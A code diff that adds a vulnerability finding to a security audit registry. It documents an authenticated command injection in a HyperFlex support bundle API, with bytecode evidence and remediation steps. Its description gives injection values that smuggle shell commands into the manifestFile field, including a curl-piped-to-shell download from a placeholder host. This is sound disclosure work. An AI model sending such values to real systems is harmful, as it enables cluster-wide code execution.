@@ -12775,6 +12775,135 @@ for _f in [
 ]:
     FINDINGS[_f["id"]] = _f
 
+HX_F227 = {
+    "id": "HX-F227",
+    "title": "Authenticated OS Command Injection via Unsanitized manifestFile Field in Support Bundle API",
+    "severity": "HIGH",
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+    "cwe": ["CWE-78"],
+    "component": (
+        "support-war/WEB-INF/classes/com/springpath/hx/support/impl/"
+        "SupportbundleApiServiceImpl.java (compiled class), "
+        "com/springpath/hx/support/impl/GenerationThread.java, "
+        "com/springpath/hx/support/clients/HxSupportSvcClient.java"
+    ),
+    "firmware_version": "HXDP 6.0.2b",
+    "description": (
+        "The HyperFlex support bundle REST API endpoint "
+        "`POST /supportBundle` accepts an `AsupCliConfiguration` JSON body with a "
+        "`manifestFile` field. When `type` is `custom-asup` and `action` is "
+        "`generate`, `SupportbundleApiServiceImpl.generateAndDeliverSupportBundle()` "
+        "concatenates the caller-supplied `manifestFile` value directly into a shell "
+        "command string using `StringConcatFactory.makeConcatWithConstants` "
+        "(BootstrapMethods entry #12, constant template: "
+        "`\"asupcli post --type custom-asup --manifestfile \\u0001\"`). "
+        "No input validation, character filtering, or shell escaping is applied. "
+        "The resulting command string is stored in a `GenerationThread` instance "
+        "(`GenerationThread.cmd` field, constructor offset 11) and passed to "
+        "`HxSupportSvcClient.executeCmd(cmd, nodeList)` at `run()` offset 174-180. "
+        "`executeCmd` calls the Thrift service method "
+        "`HxSupportSvc$Client.runCmdInAllVm(cmd, nodeList)` (bytecode offset 20), "
+        "which dispatches the command string for execution on **all cluster VMs** "
+        "via SSH. The `GenerationThread` polling loop contains the literal string "
+        "`\"ps aux | grep '[a]supcli generate --type'\"` (run() offset 87), "
+        "confirming the execution context is a shell that processes metacharacters. "
+        "An authenticated HyperFlex management user can inject arbitrary shell "
+        "commands by setting `manifestFile` to a value containing shell "
+        "metacharacters (e.g., `foo; id`, `foo && curl http://x/s|sh`, backtick "
+        "substitution). The injected command executes on every node in the cluster."
+    ),
+    "evidence": [
+        {
+            "file": "support-war: SupportbundleApiServiceImpl.class",
+            "lines": "bytecode offsets 519-549",
+            "snippet": (
+                "// type == \"custom-asup\", manifestFile non-null and non-empty:\n"
+                "519: ldc \"custom-asup\"\n"
+                "523: invokevirtual String.equalsIgnoreCase\n"
+                "529: aload 6           // manifestFile from AsupCliConfiguration\n"
+                "534: invokevirtual String.length\n"
+                "542: aload 6           // manifestFile (user-controlled)\n"
+                "544: invokedynamic #200 // template: "
+                "\"asupcli post --type custom-asup --manifestfile \\u0001\"\n"
+                "549: astore 10         // cmd = template.replace(\\u0001, manifestFile)"
+            ),
+            "note": (
+                "BootstrapMethods entry 12 constant: "
+                "'asupcli post --type custom-asup --manifestfile \\u0001'; "
+                "\\u0001 is replaced with the raw manifestFile string from the request body"
+            ),
+        },
+        {
+            "file": "support-war: GenerationThread.class",
+            "lines": "run() bytecode offsets 171-183",
+            "snippet": (
+                "171: invokestatic HxSupportSvcClientFactory.getInstance()\n"
+                "174: aload_0\n"
+                "175: getfield cmd       // the injected command string\n"
+                "178: aload 7            // nodeList\n"
+                "180: invokevirtual HxSupportSvcClient.executeCmd(String, List)"
+            ),
+            "note": "cmd field set from constructor arg; flows from manifestFile with no transformation",
+        },
+        {
+            "file": "support-war: HxSupportSvcClient.class",
+            "lines": "executeCmd() bytecode offsets 14-22",
+            "snippet": (
+                "14: aload_0\n"
+                "15: getfield cl        // HxSupportSvc$Client (Thrift)\n"
+                "18: aload_1            // cmd (user-controlled)\n"
+                "19: aload_2            // nodeList\n"
+                "20: invokevirtual HxSupportSvc$Client.runCmdInAllVm(String, List)"
+            ),
+            "note": "Thrift call dispatches unsanitized command string to server-side runCmdInAllVm",
+        },
+        {
+            "file": "support-war: GenerationThread.class",
+            "lines": "run() bytecode offset 87",
+            "snippet": (
+                '87: ldc "ps aux | grep \'[a]supcli generate --type\'"'
+            ),
+            "note": (
+                "Shell pipe in a literal string used for process polling confirms "
+                "execution context is a POSIX shell; metacharacters in cmd are interpreted"
+            ),
+        },
+    ],
+    "impact": (
+        "An authenticated HyperFlex management API user can execute arbitrary OS "
+        "commands on every node in the HyperFlex cluster simultaneously by submitting "
+        "a crafted `POST /supportBundle` request. The injected command runs in the "
+        "security context of the HxSupportSvc Thrift service process on each cluster "
+        "VM. Combined with the cluster-wide scope of `runCmdInAllVm`, a single "
+        "authenticated request can achieve persistent access or data destruction "
+        "across all cluster nodes. The support bundle API is accessible to any user "
+        "with valid HyperFlex management credentials."
+    ),
+    "remediation": (
+        "1. Pass `manifestFile` as a separate argument to `asupcli` via a string "
+        "array (e.g., `ProcessBuilder(\"asupcli\", \"post\", \"--type\", "
+        "\"custom-asup\", \"--manifestfile\", manifestFile)`) rather than "
+        "concatenating it into a single command string passed to a shell. "
+        "2. Apply a strict allowlist validation on `manifestFile` before use: "
+        "permit only alphanumeric characters, hyphens, underscores, dots, and "
+        "forward slashes; reject any value containing shell metacharacters. "
+        "3. If shell execution is required, use `ProcessBuilder` with explicit "
+        "`/bin/sh -c` and apply `ShellUtils.escapeShellArgument()` or equivalent "
+        "quoting to the `manifestFile` value before interpolation."
+    ),
+    "tags": [
+        "command-injection", "cwe-78", "authenticated", "rest-api",
+        "support-bundle", "cluster-wide", "thrift", "high",
+    ],
+}
+
+for _f in [
+    HX_F225, HX_F226,
+    HX_F227,
+]:
+    FINDINGS[_f["id"]] = _f
+
 
 # ─── Probe Functions ──────────────────────────────────────────────────────────
 
